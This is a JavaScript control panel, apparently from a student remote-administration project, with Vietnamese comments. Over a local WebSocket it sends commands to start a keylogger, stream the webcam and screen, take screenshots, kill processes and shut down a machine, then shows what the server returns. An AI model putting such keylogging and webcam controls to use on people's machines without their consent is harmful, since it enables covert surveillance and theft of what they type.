// Chờ cho toàn bộ trang web được tải xong
document.addEventListener('DOMContentLoaded', () => {
    // --- Lấy các phần tử (elements) ---
    // Nút bấm
    const btnScreenshot = document.getElementById('btn-screenshot');
    const btnShutdown = document.getElementById('btn-shutdown');
    const btnReset = document.getElementById('btn-reset');
    const btnListProcesses = document.getElementById('btn-list-processes');
    const btnListApps = document.getElementById('btn-list-apps');
    const btnStopProcess = document.getElementById('btn-stop-process');
    const btnKeylogger = document.getElementById('btn-keylogger-toggle');
    const btnCamera = document.getElementById('btn-camera-toggle');
    const btnScreen = document.getElementById('btn-screen-toggle');
    const btnOpenTerminal = document.getElementById('btn-open-terminal');
    // Vùng hiển thị
    const outputConsole = document.getElementById('output-console');
    const outputConsoleRecording = document.getElementById('output-console-recording');
    const outputConsoleCamera = document.getElementById('output-console-camera');
    // const imgContainer = document.getElementById('image-display-container');
    // const imgDisplay = document.getElementById('image-display');
    const statusText = document.getElementById('status-text');
    const statusLight = document.getElementById('status-light');
    const scrContainer = document.getElementById('screen-display-container');
    const scrDisplay = document.getElementById('screen-display');
    const camContainer = document.getElementById('camera-display-container');
    const camDisplay = document.getElementById('camera-display');

    // (Đây là nơi bạn sẽ khởi tạo kết nối WebSocket)
    // const socket = new WebSocket("ws://your-server-ip:port");
    // ...
    // (Và xử lý các sự kiện socket.onopen, socket.onmessage, ...)
    // Ví dụ, khi kết nối thành công:
    // statusText.textContent = "Đã kết nối";
    // statusLight.className = "status-light status-online";

    // --- Gán sự kiện click cho các nút ---

    // Gửi lệnh JSON qua WebSocket

    const socket = new WebSocket("ws://localhost:8080");

    function base64ToBlobFast(base64, type = 'image/bmp') {
        const binaryStr = atob(base64);
        const len = binaryStr.length;
        const bytes = new Uint8Array(len);

        for (let i = 0; i < len; i++) {
            bytes[i] = binaryStr.charCodeAt(i);
        }

        return new Blob([bytes], { type });
    }

    socket.onopen = () => {
        console.log("Kết nối WebSocket đã mở.");
        statusText.textContent = "Đã kết nối";
        statusLight.className = "status-light status-online";
    }

    socket.onmessage = (event) => {

        const saveBlob = (blob, filename = 'capture.bmp') => {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            a.remove();
            URL.revokeObjectURL(url);
        };

        console.log("Nhận dữ liệu:", event.data);
        const data = JSON.parse(event.data);
        if (data.what === "Info") {
            outputConsole.textContent = data.message;
            outputConsole.textContent += "\n";
            return;
        } else if (data.what === "Error") {
            outputConsole.textContent = `Lỗi từ server: ${data.message}`;
            return;
        } else if (data.what === "Screenshot") {
            const blob = base64ToBlobFast(data.message, 'image/bmp');
            saveBlob(blob);
            outputConsole.textContent = 'Screenshot downloaded';
            return;
        } else if (data.what === "Processes") {
            const binary = atob(data.message);
            const len = binary.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
            const decoded = new TextDecoder('utf-8').decode(bytes);
            outputConsole.textContent = decoded;
            return;
        } else if (data.what === "Applications") {
            const binary = atob(data.message);
            const len = binary.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
            const decoded = new TextDecoder('utf-8').decode(bytes);
            outputConsole.textContent = decoded;
            return;
        } else if (data.what === "Camera") {
            const imgBlob = base64ToBlobFast(data.message, 'image/bmp');

            if (typeof currentFrameUrl !== 'undefined' && currentFrameUrl) {
                try { URL.revokeObjectURL(currentFrameUrl); } catch (e) { /* ignore */ }
            }

            const imgUrl = URL.createObjectURL(imgBlob);
            currentFrameUrl = imgUrl;

            scrDisplay.src = imgUrl;
            scrContainer.style.display = 'block';
            outputConsoleRecording.textContent = `[CAMERA]: Nhận khung hình lúc ${new Date().toLocaleTimeString()}`;
            
            return;
        } else if (data.what === "Screen") { 
            const imgBlob = base64ToBlobFast(data.message, 'image/bmp');

            if (typeof currentCamFrameUrl !== 'undefined' && currentCamFrameUrl) {
                try { URL.revokeObjectURL(currentCamFrameUrl); } catch (e) { /* ignore */ }
            }
            const imgUrl = URL.createObjectURL(imgBlob);
            currentCamFrameUrl = imgUrl;
            camDisplay.src = imgUrl;
            camContainer.style.display = 'block';
            outputConsoleCamera.textContent = `[MÀN HÌNH]: Nhận khung hình lúc ${new Date().toLocaleTimeString()}`;
            return;
        }
        else if (data.what === "Keylogger") {
            outputConsole.textContent += data.message;
            return;
        }
    };

    function sendCommand(command) {
        console.log("Gửi lệnh:", command);
        socket.send(JSON.stringify(command));
        outputConsole.textContent = `[GỬI LỆNH]: ${JSON.stringify(command)}\n...Chờ phản hồi...`;
        // imgContainer.classList.add('hidden'); // Ẩn khung ảnh
    }

    btnScreenshot.addEventListener('click', () => {
        sendCommand({ command: "screenshot" });
    });

    btnShutdown.addEventListener('click', () => {
        if (confirm("Bạn có CHẮC CHẮN muốn TẮT MÁY chủ không?")) {
            sendCommand({ command: "shutdown" });
        }
    });

    btnReset.addEventListener('click', () => {
        if (confirm("Bạn có CHẮC CHẮN muốn KHỞI ĐỘNG LẠI máy chủ không?")) {
            sendCommand({ command: "restart" });
        }
    });

    btnListProcesses.addEventListener('click', () => {
        sendCommand({ command: "processes" });
    });

    btnListApps.addEventListener('click', () => {
        sendCommand({ command: "applications" });
    });

    btnStopProcess.addEventListener('click', () => {
        const pid = prompt("Nhập PID của tiến trình cần dừng:");
        if (pid) {
            sendCommand({ command: "stop_process", pid: parseInt(pid) });
        }
    });

    btnKeylogger.addEventListener('click', () => {
        const currentState = btnKeylogger.textContent;
        if (currentState.includes("Bắt đầu")) {
            sendCommand({ command: "start_keylogger" });
            btnKeylogger.textContent = "Dừng Keylogger";
            btnKeylogger.classList.add('btn-danger');
        } else {
            sendCommand({ command: "stop_keylogger" });
            btnKeylogger.textContent = "Bắt đầu Keylogger";
            btnKeylogger.classList.remove('btn-danger');
        }
    });

    btnCamera.addEventListener('click', () => {
        const currentState = btnCamera.textContent;
        if (currentState.includes("Bật")) {
            sendCommand({ command: "start_camera" });
            btnCamera.textContent = "Tắt Camera";
            btnCamera.classList.add('btn-danger');
            document.getElementById("output-area").classList.remove("hidden");
            document.getElementById("screen-display-container").classList.remove("hidden");
            document.getElementById("output-console-recording").textContent = "Đang nhận video...";
        } else {
            sendCommand({ command: "stop_camera" });
            btnCamera.textContent = "Bật Camera";
            btnCamera.classList.remove('btn-danger');
            document.getElementById("output-area").classList.add("hidden");
            document.getElementById("screen-display-container").classList.add("hidden");
            document.getElementById("output-console-recording").textContent = "";
        }
    });

    btnScreen.addEventListener('click', () => {
        const currentState = btnScreen.textContent;
        if (currentState.includes("Bật")) {
            sendCommand({ command: "start_screen" });
            btnScreen.textContent = "Tắt Màn hình";
            btnScreen.classList.add('btn-danger');
            document.getElementById("camera-area").classList.remove("hidden");
            document.getElementById("camera-display-container").classList.remove("hidden");
            document.getElementById("output-console-camera").textContent = "Đang nhận video...";
        } else {
            sendCommand({ command: "stop_screen" });
            btnScreen.textContent = "Bật Màn hình";
            btnScreen.classList.remove('btn-danger');
            document.getElementById("camera-area").classList.add("hidden");
            document.getElementById("camera-display-container").classList.add("hidden");
            document.getElementById("output-console-camera").textContent = "";
        }
    });
    btnOpenTerminal.addEventListener('click', () => {
        window.open('cmd.html', '_blank', 'width=800,height=600');
    });
});